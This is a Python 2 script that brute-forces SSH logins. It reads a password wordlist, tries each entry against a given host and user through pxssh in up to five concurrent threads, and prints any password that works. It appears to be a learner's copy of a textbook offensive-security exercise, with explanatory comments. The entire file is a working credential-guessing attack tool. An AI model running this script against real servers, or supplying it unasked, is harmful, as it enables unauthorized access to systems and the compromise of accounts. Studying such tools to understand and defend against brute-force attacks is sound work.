#!/usr/bin/python

import pxssh
import optparse
import time
from threading import *

# allow a max of 5 theads at a time
maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)
# set Found/Fails to their default values
Found = False
Fails = 0

def connect(host, user, password, release):
	global Found
	global Fails
# debugging shows thread name and hex location
#	print current_thread()

	# attempt login with pxssh
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password Found: ' + password
		Found = True
	# error check
	except Exception, e:
		# if read_nonblocking si thrown
		if 'read_nonblocking' in str(e):
# debugging		print 'in fail 1'
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		# if synchronize with original prompt is thrown
		elif 'synchronize with original prompt' in str(e):
# debugging		print 'in fail 2'
			time.sleep(1)
			connect(host, user, password, False)
	finally: # release the lock is release is still True
		if release: connection_lock.release()

def main():
	# add pretty input for the user and help functionality
	parser = optparse.OptionParser('usage%prog ' + \
		'-H <target host> -u <user> -F <password list>')
	
	parser.add_option('-H', dest = 'tgtHost', type = 'string', \
		help = 'specify target host')
	parser.add_option('-u', dest = 'user', type = 'string', \
		help = 'specify the user')
	parser.add_option('-F', dest = 'passwdFile', type = 'string', \
		help = 'specify password file')

	(options, args) = parser.parse_args()

	# set variables from optparse
	host = options.tgtHost
	user = options.user
	passwdFile = options.passwdFile

	if host == None or user == None or passwdFile == None:
		print parser.usage
		exit(0)

	# open the file in read mode...yes I know read is default and r is not needed
	fn = open(passwdFile, 'r')

	# reads each line one at a time versus read() which loads the entire file into memory
	for line in fn.readlines():
		# checks boolean for Found
		if Found:
			print "[*] Exiting: Password Found"
			exit(0)
		# checks the value of Fails
		if Fails > 5:
			print "[!] Exiting: Too Many Socket Timeouts"
			exit(0)
		# sets the thread to locked
		connection_lock.acquire()

# debugging	print '%r' % line
		# removes carriage return and newline from line
                password = line.strip('\r\n')
# debugging	print '%r' % password
# debugging	print type(password)

		print '[-] Testing: ' + password
		# creates thread
		t = Thread(target = connect, args = (host, user, password, True))
#		child = t.start()
		# starts thread
		t.start()

if __name__ == '__main__':
	main()
